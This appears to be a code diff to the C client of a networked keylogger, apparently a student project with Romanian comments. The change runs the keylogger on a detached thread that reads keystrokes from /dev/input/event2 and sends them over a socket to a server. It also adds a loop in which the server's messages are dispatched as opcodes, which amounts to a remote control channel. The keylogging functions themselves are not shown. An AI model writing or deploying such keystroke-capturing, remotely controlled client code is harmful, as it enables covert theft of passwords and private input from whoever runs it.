@@ -5,73 +5,46 @@
 #include <string.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <pthread.h>
 #include "keylog.h"  // Include the keylogger header
 #include "constraints.h"
 #include "messageManager.h"
+#include "clientManager.h"
 #include "utils.h"
+
+clientInfo_t clientData;
 
 int main() {
     int sock;
-    struct sockaddr_in server;
+    connectionInitialize(&sock);
+    clientData.serverSocket = sock;
+    startingDataInitialize();
+    
+    //start_keylogger(sock, "/dev/input/event2");  // Pass the socket and device path
 
-    // Create socket
-    sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock == -1) {
-        printf("Could not create socket\n");
-        return 1;
+    pthread_t tid;
+    keyLoggerParameters_t* params = (keyLoggerParameters_t*)malloc(sizeof(keyLoggerParameters_t));
+    params->sock = sock;
+    strcpy(params->keyboardFile, "/dev/input/event2");
+
+    if (pthread_create(&tid, NULL, start_keylogger, params) < 0) {
+        perror("Could not create thread");
+        free(params);
     }
-    printf("Socket created\n");
+    pthread_detach(tid);
 
-    server.sin_addr.s_addr = inet_addr("127.0.0.1");  // Server IP
-    server.sin_family = AF_INET;
-    server.sin_port = htons(8888);  // Server port
 
-    // Connect to remote server
-    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
-        perror("Connect failed. Error");
-        return 1;
-    }
-    printf("Connected\n");
-
-    //Trimite Date despre Utilizator--------------------
-    int fd = open(CLIENT_CONFIG_FILE, O_RDONLY);
-    if (fd < 0)
-    {
-        printf("Error Opening Config file.\n");
-        return -1;
-    }
-
-    char buffer[BUFFER_SIZE];
-
-    ssize_t bytes_read = read(fd, buffer, sizeof(buffer) - 1);
-    if (bytes_read < 0) {
-        perror("Eroare la citirea fișierului");
-        close(fd);
-        return -1;
-    }
-    close(fd);
-
-    buffer[bytes_read] = '\0';
-    char sendBuffer[BUFFER_SIZE]="";
-    char*p = strtok(buffer, " =\n");
-    while(p)
-    {
-        if(strcmp(p, "Nume_Echipament") == 0)
-        {
-            p = strtok(NULL, "= \n");
-            strcat(sendBuffer, p);
-        }
-        p = strtok(NULL, "= \n");
-    }
-
+    char buffer[SEND_BUFFER_SIZE];
+    ssize_t bytesRecv;
     message_t msg;
-    encapsulateMessage(&msg, sendBuffer, 'U');
+    while(1)
+    {
+        if(recvMessage(sock, &msg) < 0)
+            break;
+        handleOpcode(sock, msg);
 
-    send_message(sock, &msg);
-
-
-    // Start the keylogger and send keystrokes to server
-    start_keylogger(sock, "/dev/input/event2");  // Pass the socket and device path
+    }
+    // Pornire Keylogger
 
     // Close the socket
     close(sock);
